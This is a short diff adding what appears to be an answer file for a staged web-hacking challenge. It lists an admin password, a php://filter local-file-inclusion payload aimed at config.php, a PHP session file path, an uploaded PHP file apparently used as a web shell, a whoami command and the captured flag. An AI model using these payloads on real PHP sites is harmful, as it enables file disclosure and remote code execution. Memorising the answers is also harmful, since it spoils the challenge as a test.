@@ -1,0 +1,6 @@
+level 0 = Th1s_1s_Adm1n_P@SS
+level 1 = php://filter/convert.base64-encode/resource=../config.php
+level 2 = /var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732
+level 3 = /var/www/html/uploads/imaeges.php
+level 4 = whoami
+flag = DH{264495d5dc70c84d7bd740dd2d1a1709}
